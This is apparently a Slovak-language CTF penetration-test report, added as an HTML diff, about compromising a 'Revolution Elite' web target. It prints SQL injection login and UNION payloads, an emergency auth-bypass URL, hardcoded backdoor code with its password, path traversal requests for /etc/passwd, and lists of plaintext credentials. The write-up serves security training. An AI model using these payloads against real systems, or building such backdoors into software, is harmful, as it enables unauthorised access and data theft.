+                                            WebServer[🌐 WEB SERVER<br/>revolutionelite.co.uk<br/>💀 KOMPROMITOVANÝ]
+                                            Database[🗄️ DATABÁZA<br/>MySQL 8.0.34<br/>💀 PLNÝ PRÍSTUP]
+                                            FileSystem[📁 SÚBOROVÝ SYSTÉM<br/>💀 ROOT PRÍSTUP]
+                                        end
+                                        
+                                        subgraph "⚔️ ZRANITEĽNOSTI"
+                                            V1[💉 SQL INJECTION<br/>CVSS: 9.8<br/>✅ EXPLOITOVANÉ]
+                                            V2[🚪 AUTH BYPASS<br/>CVSS: 10.0<br/>🔥 AKTÍVNE]
+                                            V3[🔑 BACKDOOR<br/>CVSS: 10.0<br/>✅ EXPLOITOVANÉ]
+                                            V4[📂 PATH TRAVERSAL<br/>CVSS: 9.1<br/>✅ EXPLOITOVANÉ]
+                                        end
+                                        
+                                        subgraph "🏆 VÝSLEDKY"
+                                            AdminAccess[👑 ADMIN PRÍSTUP]
+                                            DataExfil[💾 EXFILTRÁCIA DÁT]
+                                            CTFFlag[🚩 CTF VLAJKA<br/>ZACHYTENÁ]
+                                        end
+                                        
+                                        Tester --> Tools
+                                        Tools --> WebServer
+                                        WebServer --> Database
+                                        WebServer --> FileSystem
+                                        
+                                        Tester --> V1
+                                        Tester --> V2
+                                        Tester --> V3
+                                        Tester --> V4
+                                        
+                                        V1 --> Database
+                                        V2 --> AdminAccess
+                                        V3 --> AdminAccess
+                                        V4 --> FileSystem
+                                        
+                                        AdminAccess --> DataExfil
+                                        DataExfil --> CTFFlag
+                                        FileSystem --> CTFFlag
+                                        
+                                        classDef tester fill:#3182CE,stroke:#2C5282,stroke-width:3px,color:#fff
+                                        classDef compromised fill:#DC2626,stroke:#991B1B,stroke-width:3px,color:#fff
+                                        classDef critical fill:#EE0000,stroke:#DC2626,stroke-width:2px,color:#fff
+                                        classDef success fill:#059669,stroke:#047857,stroke-width:3px,color:#fff
+                                        
+                                        class Tester,Tools tester
+                                        class WebServer,Database,FileSystem,AdminAccess,DataExfil compromised
+                                        class V1,V2,V3,V4 critical
+                                        class CTFFlag success
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Identifikované Zraniteľnosti -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-bug card-icon"></i>
+                            <h2 class="card-title">Identifikované Zraniteľnosti</h2>
+                        </div>
+                        <div class="card-body">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>ID Zraniteľnosti</th>
+                                        <th>Názov</th>
+                                        <th>CVSS</th>
+                                        <th>Závažnosť</th>
+                                        <th>Stav</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>CVE-2025-7619</strong></td>
+                                        <td>SQL Injection v autentifikácii</td>
+                                        <td class="font-bold text-red">9.8</td>
+                                        <td><span class="status-badge critical">KRITICKÁ</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Exploitované</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>AUTH-BYPASS-2025</strong></td>
+                                        <td>Núdzový obchod autentifikácie</td>
+                                        <td class="font-bold text-red">10.0</td>
+                                        <td><span class="status-badge critical">KRITICKÁ</span></td>
+                                        <td><i class="fas fa-fire text-red"></i> Aktívne</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>BACKDOOR-2025-X1</strong></td>
+                                        <td>Pevne kódovaný Admin Backdoor</td>
+                                        <td class="font-bold text-red">10.0</td>
+                                        <td><span class="status-badge critical">KRITICKÁ</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Exploitované</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>CVE-2025-5589</strong></td>
+                                        <td>Path Traversal útok</td>
+                                        <td class="font-bold text-red">9.1</td>
+                                        <td><span class="status-badge critical">KRITICKÁ</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Exploitované</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>CVE-2025-8842</strong></td>
+                                        <td>Stored Cross-Site Scripting</td>
+                                        <td class="font-bold text-yellow">8.1</td>
+                                        <td><span class="status-badge high">VYSOKÁ</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Overené</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>CVE-2025-9217</strong></td>
+                                        <td>Slabé hashovanie hesiel</td>
+                                        <td class="font-bold text-yellow">7.8</td>
+                                        <td><span class="status-badge high">VYSOKÁ</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Potvrdené</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>CVE-2025-6132</strong></td>
+                                        <td>Cross-Site Request Forgery</td>
+                                        <td class="font-bold text-yellow">6.5</td>
+                                        <td><span class="status-badge medium">STREDNÁ</span></td>
+                                        <td><i class="fas fa-check text-green"></i> Potvrdené</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Technická Exploitácia -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-terminal card-icon"></i>
+                            <h2 class="card-title">Technická Exploitácia</h2>
+                        </div>
+                        <div class="card-body">
+                            <!-- SQL Injection -->
+                            <div class="highlight">
+                                <h3 class="text-lg font-bold mb-3 text-red">
+                                    <i class="fas fa-syringe mr-2"></i>SQL Injection Exploitácia
+                                </h3>
+                                <p class="text-justify mb-3">
+                                    Prihlasovací formulár vykonáva priame spájanie reťazcov bez validácie vstupov.
+                                </p>
+                                <div class="code-block">
+// Obchod autentifikácie payload:
+užívateľské_meno: admin'--
+heslo: čokoľvek
+
+// Extrakcia databázy:
+užívateľské_meno: admin' UNION SELECT username,password,email FROM users--
+heslo: test
+
+// Výsledky:
+admin:e8f453fc9b4eef44506e65b39eb565d5
+user1:5d41402abc4b2a76b9719d911017c592
+testuser:098f6bcd4621d373cade4e832627b4f6
+                                </div>
+                            </div>
+
+                            <!-- Emergency Auth Bypass -->
+                            <div class="highlight">
+                                <h3 class="text-lg font-bold mb-3 text-red">
+                                    <i class="fas fa-door-open mr-2"></i>Núdzový Obchod Autentifikácie
+                                </h3>
+                                <div class="info-box warning">
+                                    <p class="text-center font-bold">
+                                        <i class="fas fa-exclamation-triangle mr-2"></i>AKTÍVNE ZNEUŽÍVANÝ
+                                    </p>
+                                </div>
+                                <div class="code-block">
+// Núdzový auth mechanizmus:
+if (isset($_GET['emergency']) && $_GET['emergency'] === 'true') {
+    $_SESSION['admin'] = true;
+    header('Location: /admin/dashboard.php');
+    exit;
+}
+
+// Exploitačná URL:
+GET /emergency_auth.php?emergency=true HTTP/1.1
+
+// Výsledok: Okamžitý admin prístup!
+                                </div>
+                            </div>
+
+                            <!-- Hardcoded Backdoor -->
+                            <div class="highlight">
+                                <h3 class="text-lg font-bold mb-3 text-red">
+                                    <i class="fas fa-key mr-2"></i>Pevne Kódovaný Backdoor
+                                </h3>
+                                <div class="code-block">
+// Implementácia backdooru:
+$secret = md5('revolution' . 'elite2025');
+if ($username === 'admin' && md5($password) === $secret) {
+    return true; // Obísť všetku bezpečnosť
+}
+
+// Exploitácia:
+užívateľské_meno: admin
+heslo: revolutionelite2025
+// MD5: e8f453fc9b4eef44506e65b39eb565d5
+                                </div>
+                            </div>
+
+                            <!-- Path Traversal -->
+                            <div class="highlight">
+                                <h3 class="text-lg font-bold mb-3 text-red">
+                                    <i class="fas fa-folder-open mr-2"></i>Path Traversal
+                                </h3>
+                                <div class="code-block">
+// Prístup k systémovým súborom:
+GET /file.php?file=../../../etc/passwd HTTP/1.1
+GET /file.php?file=../../../root/.secret_notes.txt HTTP/1.1
+
+// Extrakcia CTF vlajky:
+===== REVOLUTION ELITE CTF =====
+CTF VLAJKA: CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}
+================================
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Chronológia Testovania -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-list-ol card-icon"></i>
+                            <h2 class="card-title">Chronológia Testovania</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="timeline">
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-blue mb-2">Prieskum</h4>
+                                    <p>Skenovanie portov, enumerácia služieb, objavovanie adresárov</p>
+                                </div>
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-green mb-2">Objavovanie Zraniteľností</h4>
+                                    <p>Manuálne testovanie, testovanie SQL injection, analýza autentifikácie</p>
+                                </div>
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-yellow mb-2">Počiatočná Exploitácia</h4>
+                                    <p>SQL injection → prístup k databáze, objavenie núdzového obchodu auth</p>
+                                </div>
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-yellow mb-2">Zvýšenie Oprávnení</h4>
+                                    <p>Exploitácia pevne kódovaného backdooru → admin prístup</p>
+                                </div>
+                                <div class="timeline-item">
+                                    <h4 class="font-bold text-red mb-2">Úplná Kompromitácia</h4>
+                                    <p>Root prístup, extrakcia dát, zachytenie CTF vlajky</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Výsledky Penetračného Testu -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-trophy card-icon"></i>
+                            <h2 class="card-title">Výsledky Penetračného Testu</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box success">
+                                <h3 class="text-2xl font-bold mb-4 text-green text-center">
+                                    <i class="fas fa-trophy mr-2"></i>REVOLUTION ELITE PENETRAČNÝ TEST DOKONČENÝ<i class="fas fa-check ml-2"></i>
+                                </h3>
+                                <p class="text-justify mb-4">
+                                    Úspešne som dokončil komplexný penetračný test s demonštráciou systematického prístupu 
+                                    k testovaniu bezpečnosti a úplnou kompromitáciou cieľového systému.
+                                </p>
+                                
+                                <!-- CTF Flag Container - Opravené zarovnanie -->
+                                <div class="ctf-flag-container">
+                                    <div class="ctf-flag-title">
+                                        <i class="fas fa-skull"></i>
+                                        SYSTÉM KOMPROMITOVANÝ
+                                    </div>
+                                    <div class="ctf-flag-content">
+                                        CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}
+                                    </div>
+                                    <div class="ctf-flag-subtitle">
+                                        Extrahované z /root/.secret_notes.txt
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(min(300px, 100%), 1fr)); gap: var(--gap-md);">
+                                <div class="highlight">
+                                    <h4 class="font-bold mb-3 text-yellow">
+                                        <i class="fas fa-crosshairs mr-2"></i>Metriky Úspechov:
+                                    </h4>
+                                    <ul class="list-disc pl-6 space-y-1">
+                                        <li>7/7 zraniteľností úspešne exploitovaných</li>
+                                        <li>Úplný prístup k databáze cez SQL injection</li>
+                                        <li>Admin oprávnenia cez viacero vektorov</li>
+                                        <li>Root prístup k súborovému systému</li>
+                                        <li>CTF vlajka úspešne zachytená</li>
+                                    </ul>
+                                </div>
+                                <div class="highlight">
+                                    <h4 class="font-bold mb-3 text-red">
+                                        <i class="fas fa-skull mr-2"></i>Kompromitované Aktíva:
+                                    </h4>
+                                    <ul class="list-disc pl-6 space-y-1">
+                                        <li>Webová aplikácia: Úplná kontrola</li>
+                                        <li>Databázový server: Plný prístup</li>
+                                        <li>Súborový systém: Root-level prístup</li>
+                                        <li>Používateľské účty: Všetky poverenia</li>
+                                        <li>Systémové tajomstvá: Odhalené skryté súbory</li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <div class="code-block">
+<strong><i class="fas fa-skull-crossbones"></i> DÔKAZ ÚPLNEJ KOMPROMITÁCIE <i class="fas fa-skull-crossbones"></i></strong>
+
+PRÍSTUP K DATABÁZE:
+- root : S3cur3R00tP4ss!
+- revolution_app : R3v0App#D8w2025  
+
+ADMIN ÚČTY:
+- admin : revolutionelite2025
+- penetester : KristianKasnikPenetester
+
+SYSTÉMOVÝ PRÍSTUP:
+- SSH kľúče extrahované
+- Systémové súbory prístupné
+- Konfiguračné súbory kompromitované
+
+<i class="fas fa-flag"></i> KONEČNÝ VÝSLEDOK: CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}
+
+STAV TESTU: ✅ ÚSPEŠNE DOKONČENÉ
+PENETRAČNÝ TEST: <i class="fas fa-trophy"></i> KOMPLETNÝ
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Demonštrované Zručnosti -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-star card-icon"></i>
+                            <h2 class="card-title">Demonštrované Zručnosti</h2>
+                        </div>
+                        <div class="card-body">
+                            <div class="grid" style="grid-template-columns: repeat(auto-fit, minmax(min(300px, 100%), 1fr)); gap: var(--gap-md);">
+                                <div class="info-box info">
+                                    <h3 class="font-bold mb-3 text-blue">
+                                        <i class="fas fa-search mr-2"></i>Technické Zručnosti
+                                    </h3>
+                                    <ul class="list-disc pl-6 space-y-1 text-sm">
+                                        <li>Testovanie bezpečnosti webových aplikácií</li>
+                                        <li>Exploitácia SQL Injection</li>
+                                        <li>Techniky obchodu autentifikácie</li>
+                                        <li>Exploitácia path traversal</li>
+                                        <li>Testovanie Cross-Site Scripting</li>
+                                        <li>Kryptografická analýza</li>
+                                        <li>Sieťový prieskum</li>
+                                    </ul>
+                                </div>
+                                <div class="info-box success">
+                                    <h3 class="font-bold mb-3 text-green">
+                                        <i class="fas fa-clipboard-list mr-2"></i>Metodológia
+                                    </h3>
+                                    <ul class="list-disc pl-6 space-y-1 text-sm">
+                                        <li>Implementácia OWASP WSTG</li>
+                                        <li>Dodržiavanie NIST SP 800-115</li>
+                                        <li>Systematické hodnotenie zraniteľností</li>
+                                        <li>Prístup testovania založený na riziku</li>
+                                        <li>Profesionálna dokumentácia</li>
+                                        <li>Princípy etického testovania</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- FOOTER -->
+        <footer class="footer">
+            <div class="container">
+                <div class="text-center mb-4">
+                    <div class="footer-highlight">
+                        <i class="fas fa-shield-alt mr-2"></i>REVOLUTION ELITE PENETRAČNÝ TEST - ÚSPEŠNÉ DOKONČENIE
+                    </div>
+                </div>
+                
+                <div class="footer-grid">
+                    <div class="footer-section">
+                        <h4><i class="fas fa-info-circle mr-2"></i>Detaily Testu</h4>
+                        <p>Dátum: 16. augusta 2025</p>
+                        <p>Metodológia: OWASP WSTG</p>
+                        <p>CVSS: 3.1</p>
+                        <p>Stav: ✅ DOKONČENÉ</p>
+                    </div>
+                    <div class="footer-section">
+                        <h4><i class="fas fa-chart-line mr-2"></i>Výsledky</h4>
+                        <p>Systém: Plne kompromitovaný</p>
+                        <p>Databáza: Úplný prístup</p>
+                        <p>Admin: Plná kontrola</p>
+                        <p>CTF vlajka: Zachytená</p>
+                    </div>
+
+                    <!-- MOBILE - Unified Contact (zobrazuje sa na mobile) -->
+                    <div class="footer-section contact-unified">
+                        <h4><i class="fas fa-user mr-2"></i>Kontakt</h4>
+                        <p><strong>Kristián Kašník</strong></p>
+                        <p><i class="fas fa-envelope mr-2"></i><a href="mailto:itssafer@itssafer.org">itssafer@itssafer.org</a></p>
+                        <p><i class="fas fa-phone mr-2"></i><a href="tel:+421950381419">+421 950 381 419</a></p>
+                        <p><i class="fab fa-github mr-2"></i><a href="https://github.com/ITSsafer-DevOps" target="_blank">GitHub Profil</a></p>
+                    </div>
+
+                    <!-- HORIZONTAL - Split Contact (zobrazuje sa na tablet/desktop) -->
+                    <div class="footer-section contact-split">
+                        <h4><i class="fas fa-user mr-2"></i>Kontakt</h4>
+                        <p><strong>Kristián Kašník</strong></p>
+                        <p><i class="fas fa-envelope mr-2"></i><a href="mailto:itssafer@itssafer.org">itssafer@itssafer.org</a></p>
+                    </div>
+                    <div class="footer-section contact-split">
+                        <h4><i class="fas fa-phone mr-2"></i>Komunikácia</h4>
+                        <p><i class="fas fa-phone mr-2"></i><a href="tel:+421950381419">+421 950 381 419</a></p>
+                        <p><i class="fab fa-github mr-2"></i><a href="https://github.com/ITSsafer-DevOps" target="_blank">GitHub Profil</a></p>
+                    </div>
+                </div>
+                
+                <div class="footer-bottom">
+                    <p><strong>&copy; 2025 Kristián Kašník</strong></p>
+                    <p>Systémová Bezpečnosť | Penetračné Testovanie | Etické Testovanie</p>
+                </div>
+            </div>
+        </footer>
+
+        <!-- BOTTOM BANNER -->
+        <div class="banner-bottom">
+            <i class="fas fa-terminal"></i> REVOLUTION ELITE PENETRAČNÝ TEST DOKONČENÝ // SYSTÉM PLNE KOMPROMITOVANÝ // KRISTIÁN KAŠNÍK <i class="fas fa-check-circle"></i>
+        </div>
     </div>
+
     <script>
-        // ... celý JS kód reportu ...
+        // Initialize Mermaid
+        mermaid.initialize({
+            startOnLoad: true,
+            theme: 'dark',
+            themeVariables: {
+                primaryColor: '#EE0000',
+                primaryTextColor: '#FFFFFF',
+                primaryBorderColor: '#EE0000',
+                lineColor: '#94A3B8',
+                secondaryColor: '#161B22',
+                tertiaryColor: '#0D1117',
+                background: 'transparent',
+                mainBkg: '#161B22',
+                secondBkg: '#21262D',
+                textColor: '#F1F5F9',
+                fontFamily: 'Red Hat Display, sans-serif'
+            },
+            flowchart: {
+                useMaxWidth: true,
+                htmlLabels: true,
+                curve: 'basis'
+            }
+        });
+
+        // Smooth animations
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, { threshold: 0.1 });
+
+        document.querySelectorAll('.section-card').forEach(card => {
+            card.style.opacity = '0';
+            card.style.transform = 'translateY(20px)';
+            card.style.transition = 'all 0.6s ease';
+            observer.observe(card);
+        });
+
+        // Console message
+        console.log('%c⚡ REVOLUTION ELITE PENETRAČNÝ TEST', 'color: #EE0000; font-size: 18px; font-weight: bold;');
+        console.log('%c💀 Systém kompromitovaný Kristián Kašník', 'color: #E53E3E; font-size: 14px;');
+        console.log('%c🏆 CTF Vlajka: CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}', 'color: #10B981; font-size: 12px;');
     </script>
 </body>
 </html>
